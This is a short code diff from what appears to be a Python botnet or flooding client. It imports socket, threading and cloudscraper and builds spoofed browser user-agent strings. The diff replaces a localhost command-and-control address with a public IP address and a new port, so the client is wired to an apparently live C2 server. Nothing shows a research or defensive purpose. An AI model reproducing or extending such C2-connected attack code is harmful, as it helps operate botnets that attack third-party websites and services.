@@ -1,7 +1,7 @@
 import socket, threading, time, random, cloudscraper, requests
 
-C2_ADDRESS  = "127.0.0.1"
-C2_PORT     = 6667
+C2_ADDRESS  = "3.121.139.82"
+C2_PORT     = 11344
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
